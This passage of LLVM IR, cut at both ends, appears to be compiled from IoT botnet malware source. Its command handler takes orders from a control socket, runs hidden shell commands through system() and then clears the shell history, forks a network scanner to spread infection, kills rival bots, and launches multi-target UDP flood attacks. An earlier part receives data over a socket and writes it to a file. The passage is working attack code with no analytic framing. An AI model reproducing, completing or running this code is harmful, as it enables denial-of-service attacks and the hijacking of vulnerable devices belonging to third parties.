  %150 = call i32 @fputc(i32 noundef %148, %struct._IO_FILE* noundef %149)
  br label %151

151:                                              ; preds = %143
  %152 = load i32, i32* %8, align 4
  %153 = add nsw i32 %152, 1
  store i32 %153, i32* %8, align 4
  br label %139, !llvm.loop !65

154:                                              ; preds = %139
  br label %161

155:                                              ; preds = %129
  br label %156

156:                                              ; preds = %155
  %157 = load i32, i32* %8, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %8, align 4
  br label %125, !llvm.loop !66

159:                                              ; preds = %125
  br label %110

160:                                              ; preds = %116
  br label %161

161:                                              ; preds = %160, %154
  br label %162

162:                                              ; preds = %192, %161
  %163 = load i32, i32* %6, align 4
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %165 = call i64 @recv(i32 noundef %163, i8* noundef %164, i64 noundef 4096, i32 noundef 0)
  %166 = trunc i64 %165 to i32
  store i32 %166, i32* %17, align 4
  %167 = icmp sle i32 %166, 0
  br i1 %167, label %168, label %169

168:                                              ; preds = %162
  br label %193

169:                                              ; preds = %162
  %170 = load i32, i32* %17, align 4
  %171 = icmp slt i32 %170, 4096
  br i1 %171, label %172, label %176

172:                                              ; preds = %169
  %173 = load i32, i32* %17, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %174
  store i8 0, i8* %175, align 1
  br label %176

176:                                              ; preds = %172, %169
  store i32 0, i32* %18, align 4
  br label %177

177:                                              ; preds = %189, %176
  %178 = load i32, i32* %18, align 4
  %179 = load i32, i32* %17, align 4
  %180 = icmp slt i32 %178, %179
  br i1 %180, label %181, label %192

181:                                              ; preds = %177
  %182 = load i32, i32* %18, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %183
  %185 = load i8, i8* %184, align 1
  %186 = sext i8 %185 to i32
  %187 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %188 = call i32 @fputc(i32 noundef %186, %struct._IO_FILE* noundef %187)
  br label %189

189:                                              ; preds = %181
  %190 = load i32, i32* %18, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %18, align 4
  br label %177, !llvm.loop !67

192:                                              ; preds = %177
  br label %162

193:                                              ; preds = %168
  %194 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %195 = call i32 @fclose(%struct._IO_FILE* noundef %194)
  %196 = load i32, i32* %6, align 4
  %197 = call i32 @close(i32 noundef %196)
  store i32 0, i32* %3, align 4
  br label %198

198:                                              ; preds = %193, %98, %70, %21
  %199 = load i32, i32* %3, align 4
  ret i32 %199
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strncmp(i8* noundef, i8* noundef, i64 noundef) #1

declare %struct.hostent* @gethostbyname(i8* noundef) #3

declare i32 @fputc(i32 noundef, %struct._IO_FILE* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @processCmd(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i64, align 8
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcmp(i8* noundef %51, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i64 0, i64 0)) #11
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %95, label %54

54:                                               ; preds = %2
  %55 = load i8**, i8*** %4, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @strcmp(i8* noundef %57, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.432, i64 0, i64 0)) #11
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %64, label %60

60:                                               ; preds = %54
  %61 = call i32 @system(i8* noundef getelementptr inbounds ([139 x i8], [139 x i8]* @.str.433, i64 0, i64 0))
  call void @ClearHistory()
  %62 = load i32, i32* @mainCommSock, align 4
  %63 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %62, i8* noundef getelementptr inbounds ([26 x i8], [26 x i8]* @.str.434, i64 0, i64 0))
  br label %64

64:                                               ; preds = %60, %54
  %65 = load i8**, i8*** %4, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 1
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @strcmp(i8* noundef %67, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i64 0, i64 0)) #11
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %74, label %70

70:                                               ; preds = %64
  %71 = call i32 @system(i8* noundef getelementptr inbounds ([56 x i8], [56 x i8]* @.str.436, i64 0, i64 0))
  call void @ClearHistory()
  %72 = load i32, i32* @mainCommSock, align 4
  %73 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %72, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.437, i64 0, i64 0))
  br label %74

74:                                               ; preds = %70, %64
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 1
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @strcmp(i8* noundef %77, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i64 0, i64 0)) #11
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %84, label %80

80:                                               ; preds = %74
  %81 = call i32 @system(i8* noundef getelementptr inbounds ([31 x i8], [31 x i8]* @.str.439, i64 0, i64 0))
  call void @ClearHistory()
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %82, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.440, i64 0, i64 0))
  br label %84

84:                                               ; preds = %80, %74
  %85 = load i8**, i8*** %4, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @strcmp(i8* noundef %87, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.441, i64 0, i64 0)) #11
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %94, label %90

90:                                               ; preds = %84
  %91 = call i32 @system(i8* noundef getelementptr inbounds ([40 x i8], [40 x i8]* @.str.442, i64 0, i64 0))
  call void @ClearHistory()
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %92, i8* noundef getelementptr inbounds ([25 x i8], [25 x i8]* @.str.443, i64 0, i64 0))
  br label %94

94:                                               ; preds = %90, %84
  br label %95

95:                                               ; preds = %94, %2
  %96 = load i8**, i8*** %4, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 0
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @strcmp(i8* noundef %98, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i64 0, i64 0)) #11
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %104, label %101

101:                                              ; preds = %95
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %102, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.444, i64 0, i64 0))
  br label %921

104:                                              ; preds = %95
  %105 = load i8**, i8*** %4, align 8
  %106 = getelementptr inbounds i8*, i8** %105, i64 0
  %107 = load i8*, i8** %106, align 8
  %108 = call i32 @strcmp(i8* noundef %107, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.445, i64 0, i64 0)) #11
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %114, label %110

110:                                              ; preds = %104
  %111 = load i32, i32* @mainCommSock, align 4
  %112 = call i32 @getdtablesize() #12
  %113 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %111, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i64 0, i64 0), i32 noundef %112)
  br label %921

114:                                              ; preds = %104
  %115 = load i8**, i8*** %4, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 0
  %117 = load i8*, i8** %116, align 8
  %118 = call i32 @strcmp(i8* noundef %117, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i64 0, i64 0)) #11
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %123, label %120

120:                                              ; preds = %114
  %121 = load i32, i32* @mainCommSock, align 4
  %122 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %121, i8* noundef getelementptr inbounds ([23 x i8], [23 x i8]* @.str.446, i64 0, i64 0))
  call void (i32, ...) bitcast (void ()* @binsBins to void (i32, ...)*)(i32 noundef 1)
  br label %921

123:                                              ; preds = %114
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 0
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 @strcmp(i8* noundef %126, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.447, i64 0, i64 0)) #11
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %185, label %129

129:                                              ; preds = %123
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 1
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @strcmp(i8* noundef %132, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i64 0, i64 0)) #11
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %144, label %135

135:                                              ; preds = %129
  %136 = load i32, i32* @scanPid, align 4
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %139

138:                                              ; preds = %135
  br label %921

139:                                              ; preds = %135
  %140 = load i32, i32* @scanPid, align 4
  %141 = call i32 @kill(i32 noundef %140, i32 noundef 9) #12
  %142 = load i32, i32* @mainCommSock, align 4
  %143 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %142, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.448, i64 0, i64 0))
  store i32 0, i32* @scanPid, align 4
  br label %144

144:                                              ; preds = %139, %129
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 1
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @strcmp(i8* noundef %147, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.449, i64 0, i64 0)) #11
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %184, label %150

150:                                              ; preds = %144
  %151 = load i32, i32* @scanPid, align 4
  %152 = icmp ne i32 %151, 0
  br i1 %152, label %153, label %154

153:                                              ; preds = %150
  br label %921

154:                                              ; preds = %150
  %155 = call i32 @fork() #12
  store i32 %155, i32* %5, align 4
  store i32 8192, i32* %7, align 4
  %156 = call i64 @sysconf(i32 noundef 84) #12
  %157 = mul nsw i64 %156, 64
  %158 = trunc i64 %157 to i32
  store i32 %158, i32* %8, align 4
  store i32 10, i32* %9, align 4
  %159 = load i32, i32* %5, align 4
  %160 = icmp sgt i32 %159, 0
  br i1 %160, label %161, label %163

161:                                              ; preds = %154
  %162 = load i32, i32* %5, align 4
  store i32 %162, i32* @scanPid, align 4
  br label %921

163:                                              ; preds = %154
  %164 = load i32, i32* %5, align 4
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %166, label %167

166:                                              ; preds = %163
  br label %921

167:                                              ; preds = %163
  br label %168

168:                                              ; preds = %167
  %169 = load i32, i32* @mainCommSock, align 4
  %170 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %171 = call i8* @inet_ntoa(i32 %170) #12
  %172 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %169, i8* noundef getelementptr inbounds ([26 x i8], [26 x i8]* @.str.450, i64 0, i64 0), i8* noundef %171)
  store i32 0, i32* %6, align 4
  br label %173

173:                                              ; preds = %180, %168
  %174 = load i32, i32* %6, align 4
  %175 = load i32, i32* %8, align 4
  %176 = icmp slt i32 %174, %175
  br i1 %176, label %177, label %183

177:                                              ; preds = %173
  %178 = load i32, i32* %9, align 4
  %179 = load i32, i32* %7, align 4
  call void @StartTheLelz(i32 noundef %178, i32 noundef %179)
  br label %180

180:                                              ; preds = %177
  %181 = load i32, i32* %6, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %6, align 4
  br label %173, !llvm.loop !68

183:                                              ; preds = %173
  call void @_exit(i32 noundef 0) #14
  unreachable

184:                                              ; preds = %144
  br label %185

185:                                              ; preds = %184, %123
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 0
  %188 = load i8*, i8** %187, align 8
  %189 = call i32 @strcmp(i8* noundef %188, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i64 0, i64 0)) #11
  %190 = icmp ne i32 %189, 0
  br i1 %190, label %200, label %191

191:                                              ; preds = %185
  %192 = call i32 @listFork()
  %193 = icmp ne i32 %192, 0
  br i1 %193, label %199, label %194

194:                                              ; preds = %191
  %195 = load i32, i32* @mainCommSock, align 4
  %196 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %197 = call i8* @inet_ntoa(i32 %196) #12
  %198 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %195, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.452, i64 0, i64 0), i8* noundef %197)
  call void @botkiller()
  call void @_exit(i32 noundef 0) #14
  unreachable

199:                                              ; preds = %191
  br label %200

200:                                              ; preds = %199, %185
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 0
  %203 = load i8*, i8** %202, align 8
  %204 = call i32 @strcmp(i8* noundef %203, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.453, i64 0, i64 0)) #11
  %205 = icmp ne i32 %204, 0
  br i1 %205, label %211, label %206

206:                                              ; preds = %200
  %207 = load i32, i32* @mainCommSock, align 4
  %208 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %209 = call i8* @inet_ntoa(i32 %208) #12
  %210 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %207, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.454, i64 0, i64 0), i8* noundef %209)
  br label %921

211:                                              ; preds = %200
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 0
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @strcmp(i8* noundef %214, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.455, i64 0, i64 0)) #11
  %216 = icmp ne i32 %215, 0
  br i1 %216, label %362, label %217

217:                                              ; preds = %211
  %218 = load i32, i32* %3, align 4
  %219 = icmp slt i32 %218, 6
  br i1 %219, label %271, label %220

220:                                              ; preds = %217
  %221 = load i8**, i8*** %4, align 8
  %222 = getelementptr inbounds i8*, i8** %221, i64 3
  %223 = load i8*, i8** %222, align 8
  %224 = call i32 @atoi(i8* noundef %223) #11
  %225 = icmp eq i32 %224, -1
  br i1 %225, label %271, label %226

226:                                              ; preds = %220
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 2
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @atoi(i8* noundef %229) #11
  %231 = icmp eq i32 %230, -1
  br i1 %231, label %271, label %232

232:                                              ; preds = %226
  %233 = load i8**, i8*** %4, align 8
  %234 = getelementptr inbounds i8*, i8** %233, i64 4
  %235 = load i8*, i8** %234, align 8
  %236 = call i32 @atoi(i8* noundef %235) #11
  %237 = icmp eq i32 %236, -1
  br i1 %237, label %271, label %238

238:                                              ; preds = %232
  %239 = load i8**, i8*** %4, align 8
  %240 = getelementptr inbounds i8*, i8** %239, i64 5
  %241 = load i8*, i8** %240, align 8
  %242 = call i32 @atoi(i8* noundef %241) #11
  %243 = icmp eq i32 %242, -1
  br i1 %243, label %271, label %244

244:                                              ; preds = %238
  %245 = load i8**, i8*** %4, align 8
  %246 = getelementptr inbounds i8*, i8** %245, i64 5
  %247 = load i8*, i8** %246, align 8
  %248 = call i32 @atoi(i8* noundef %247) #11
  %249 = icmp sgt i32 %248, 65536
  br i1 %249, label %271, label %250

250:                                              ; preds = %244
  %251 = load i8**, i8*** %4, align 8
  %252 = getelementptr inbounds i8*, i8** %251, i64 5
  %253 = load i8*, i8** %252, align 8
  %254 = call i32 @atoi(i8* noundef %253) #11
  %255 = icmp sgt i32 %254, 65500
  br i1 %255, label %271, label %256

256:                                              ; preds = %250
  %257 = load i8**, i8*** %4, align 8
  %258 = getelementptr inbounds i8*, i8** %257, i64 4
  %259 = load i8*, i8** %258, align 8
  %260 = call i32 @atoi(i8* noundef %259) #11
  %261 = icmp sgt i32 %260, 32
  br i1 %261, label %271, label %262

262:                                              ; preds = %256
  %263 = load i32, i32* %3, align 4
  %264 = icmp eq i32 %263, 7
  br i1 %264, label %265, label %274

265:                                              ; preds = %262
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 6
  %268 = load i8*, i8** %267, align 8
  %269 = call i32 @atoi(i8* noundef %268) #11
  %270 = icmp slt i32 %269, 1
  br i1 %270, label %271, label %274

271:                                              ; preds = %265, %256, %250, %244, %238, %232, %226, %220, %217
  %272 = load i32, i32* @mainCommSock, align 4
  %273 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %272, i8* noundef getelementptr inbounds ([113 x i8], [113 x i8]* @.str.456, i64 0, i64 0))
  br label %921

274:                                              ; preds = %265, %262
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 1
  %277 = load i8*, i8** %276, align 8
  store i8* %277, i8** %10, align 8
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds i8*, i8** %278, i64 2
  %280 = load i8*, i8** %279, align 8
  %281 = call i32 @atoi(i8* noundef %280) #11
  store i32 %281, i32* %11, align 4
  %282 = load i8**, i8*** %4, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 3
  %284 = load i8*, i8** %283, align 8
  %285 = call i32 @atoi(i8* noundef %284) #11
  store i32 %285, i32* %12, align 4
  %286 = load i8**, i8*** %4, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 4
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 @atoi(i8* noundef %288) #11
  store i32 %289, i32* %13, align 4
  %290 = load i8**, i8*** %4, align 8
  %291 = getelementptr inbounds i8*, i8** %290, i64 5
  %292 = load i8*, i8** %291, align 8
  %293 = call i32 @atoi(i8* noundef %292) #11
  store i32 %293, i32* %14, align 4
  %294 = load i32, i32* %3, align 4
  %295 = icmp sgt i32 %294, 6
  br i1 %295, label %296, label %301

296:                                              ; preds = %274
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 6
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 @atoi(i8* noundef %299) #11
  br label %302

301:                                              ; preds = %274
  br label %302

302:                                              ; preds = %301, %296
  %303 = phi i32 [ %300, %296 ], [ 1000, %301 ]
  store i32 %303, i32* %15, align 4
  %304 = load i32, i32* %3, align 4
  %305 = icmp sgt i32 %304, 7
  br i1 %305, label %306, label %311

306:                                              ; preds = %302
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 7
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* noundef %309) #11
  br label %312

311:                                              ; preds = %302
  br label %312

312:                                              ; preds = %311, %306
  %313 = phi i32 [ %310, %306 ], [ 1000000, %311 ]
  store i32 %313, i32* %16, align 4
  %314 = load i32, i32* %3, align 4
  %315 = icmp sgt i32 %314, 8
  br i1 %315, label %316, label %321

316:                                              ; preds = %312
  %317 = load i8**, i8*** %4, align 8
  %318 = getelementptr inbounds i8*, i8** %317, i64 8
  %319 = load i8*, i8** %318, align 8
  %320 = call i32 @atoi(i8* noundef %319) #11
  br label %322

321:                                              ; preds = %312
  br label %322

322:                                              ; preds = %321, %316
  %323 = phi i32 [ %320, %316 ], [ 0, %321 ]
  store i32 %323, i32* %17, align 4
  %324 = load i8*, i8** %10, align 8
  %325 = call i8* @strstr(i8* noundef %324, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #11
  %326 = icmp ne i8* %325, null
  br i1 %326, label %327, label %348

327:                                              ; preds = %322
  %328 = load i8*, i8** %10, align 8
  %329 = call i8* @strtok(i8* noundef %328, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %329, i8** %18, align 8
  br label %330

330:                                              ; preds = %345, %327
  %331 = load i8*, i8** %18, align 8
  %332 = icmp ne i8* %331, null
  br i1 %332, label %333, label %347

333:                                              ; preds = %330
  %334 = call i32 @listFork()
  %335 = icmp ne i32 %334, 0
  br i1 %335, label %345, label %336

336:                                              ; preds = %333
  %337 = load i8*, i8** %18, align 8
  %338 = load i32, i32* %11, align 4
  %339 = load i32, i32* %12, align 4
  %340 = load i32, i32* %13, align 4
  %341 = load i32, i32* %14, align 4
  %342 = load i32, i32* %15, align 4
  %343 = load i32, i32* %16, align 4
  %344 = load i32, i32* %17, align 4
  call void @sendUDP(i8* noundef %337, i32 noundef %338, i32 noundef %339, i32 noundef %340, i32 noundef %341, i32 noundef %342, i32 noundef %343, i32 noundef %344)
  call void @_exit(i32 noundef 0) #14
  unreachable

345:                                              ; preds = %333
  %346 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %346, i8** %18, align 8
  br label %330, !llvm.loop !69

347:                                              ; preds = %330
  br label %361

348:                                              ; preds = %322
  %349 = call i32 @listFork()
  %350 = icmp ne i32 %349, 0
  br i1 %350, label %360, label %351

351:                                              ; preds = %348
  %352 = load i8*, i8** %10, align 8
  %353 = load i32, i32* %11, align 4
  %354 = load i32, i32* %12, align 4
  %355 = load i32, i32* %13, align 4
  %356 = load i32, i32* %14, align 4
  %357 = load i32, i32* %15, align 4
  %358 = load i32, i32* %16, align 4
  %359 = load i32, i32* %17, align 4
  call void @sendUDP(i8* noundef %352, i32 noundef %353, i32 noundef %354, i32 noundef %355, i32 noundef %356, i32 noundef %357, i32 noundef %358, i32 noundef %359)
  call void @_exit(i32 noundef 0) #14
  unreachable

360:                                              ; preds = %348
  br label %361

361:                                              ; preds = %360, %347
  br label %921

362:                                              ; preds = %211
  %363 = load i8**, i8*** %4, align 8
  %364 = getelementptr inbounds i8*, i8** %363, i64 0
  %365 = load i8*, i8** %364, align 8
  %366 = call i32 @strcmp(i8* noundef %365, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.457, i64 0, i64 0)) #11
  %367 = icmp ne i32 %366, 0
  br i1 %367, label %491, label %368

368:                                              ; preds = %362
  %369 = load i32, i32* %3, align 4
  %370 = icmp slt i32 %369, 6
  br i1 %370, label %413, label %371

371:                                              ; preds = %368
  %372 = load i8**, i8*** %4, align 8
  %373 = getelementptr inbounds i8*, i8** %372, i64 3
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @atoi(i8* noundef %374) #11
  %376 = icmp eq i32 %375, -1
  br i1 %376, label %413, label %377

377:                                              ; preds = %371
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 2
  %380 = load i8*, i8** %379, align 8
  %381 = call i32 @atoi(i8* noundef %380) #11
  %382 = icmp eq i32 %381, -1
  br i1 %382, label %413, label %383

383:                                              ; preds = %377
  %384 = load i8**, i8*** %4, align 8
  %385 = getelementptr inbounds i8*, i8** %384, i64 4
  %386 = load i8*, i8** %385, align 8
  %387 = call i32 @atoi(i8* noundef %386) #11
  %388 = icmp eq i32 %387, -1
  br i1 %388, label %413, label %389

389:                                              ; preds = %383
  %390 = load i8**, i8*** %4, align 8
  %391 = getelementptr inbounds i8*, i8** %390, i64 4
  %392 = load i8*, i8** %391, align 8
  %393 = call i32 @atoi(i8* noundef %392) #11
  %394 = icmp sgt i32 %393, 32
  br i1 %394, label %413, label %395

395:                                              ; preds = %389
  %396 = load i32, i32* %3, align 4
  %397 = icmp sgt i32 %396, 6
  br i1 %397, label %398, label %404

398:                                              ; preds = %395
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 6
  %401 = load i8*, i8** %400, align 8
  %402 = call i32 @atoi(i8* noundef %401) #11
  %403 = icmp slt i32 %402, 0
  br i1 %403, label %413, label %404

404:                                              ; preds = %398, %395
  %405 = load i32, i32* %3, align 4
  %406 = icmp eq i32 %405, 8
  br i1 %406, label %407, label %416

407:                                              ; preds = %404
  %408 = load i8**, i8*** %4, align 8
  %409 = getelementptr inbounds i8*, i8** %408, i64 7
  %410 = load i8*, i8** %409, align 8
  %411 = call i32 @atoi(i8* noundef %410) #11
  %412 = icmp slt i32 %411, 1
  br i1 %412, label %413, label %416

413:                                              ; preds = %407, %398, %389, %383, %377, %371, %368
  %414 = load i32, i32* @mainCommSock, align 4
  %415 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %414, i8* noundef getelementptr inbounds ([186 x i8], [186 x i8]* @.str.458, i64 0, i64 0))
  br label %921

416:                                              ; preds = %407, %404
  %417 = load i8**, i8*** %4, align 8
  %418 = getelementptr inbounds i8*, i8** %417, i64 1
  %419 = load i8*, i8** %418, align 8
  store i8* %419, i8** %19, align 8
  %420 = load i8**, i8*** %4, align 8
  %421 = getelementptr inbounds i8*, i8** %420, i64 2
  %422 = load i8*, i8** %421, align 8
  %423 = call i32 @atoi(i8* noundef %422) #11
  store i32 %423, i32* %20, align 4
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 3
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* noundef %426) #11
  store i32 %427, i32* %21, align 4
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 4
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @atoi(i8* noundef %430) #11
  store i32 %431, i32* %22, align 4
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 5
  %434 = load i8*, i8** %433, align 8
  store i8* %434, i8** %23, align 8
  %435 = load i32, i32* %3, align 4
  %436 = icmp eq i32 %435, 8
  br i1 %436, label %437, label %442

437:                                              ; preds = %416
  %438 = load i8**, i8*** %4, align 8
  %439 = getelementptr inbounds i8*, i8** %438, i64 7
  %440 = load i8*, i8** %439, align 8
  %441 = call i32 @atoi(i8* noundef %440) #11
  br label %443

442:                                              ; preds = %416
  br label %443

443:                                              ; preds = %442, %437
  %444 = phi i32 [ %441, %437 ], [ 10, %442 ]
  store i32 %444, i32* %24, align 4
  %445 = load i32, i32* %3, align 4
  %446 = icmp sgt i32 %445, 6
  br i1 %446, label %447, label %452

447:                                              ; preds = %443
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 6
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @atoi(i8* noundef %450) #11
  br label %453

452:                                              ; preds = %443
  br label %453

453:                                              ; preds = %452, %447
  %454 = phi i32 [ %451, %447 ], [ 0, %452 ]
  store i32 %454, i32* %25, align 4
  %455 = load i8*, i8** %19, align 8
  %456 = call i8* @strstr(i8* noundef %455, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #11
  %457 = icmp ne i8* %456, null
  br i1 %457, label %458, label %478

458:                                              ; preds = %453
  %459 = load i8*, i8** %19, align 8
  %460 = call i8* @strtok(i8* noundef %459, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %460, i8** %26, align 8
  br label %461

461:                                              ; preds = %475, %458
  %462 = load i8*, i8** %26, align 8
  %463 = icmp ne i8* %462, null
  br i1 %463, label %464, label %477

464:                                              ; preds = %461
  %465 = call i32 @listFork()
  %466 = icmp ne i32 %465, 0
  br i1 %466, label %475, label %467

467:                                              ; preds = %464
  %468 = load i8*, i8** %26, align 8
  %469 = load i32, i32* %20, align 4
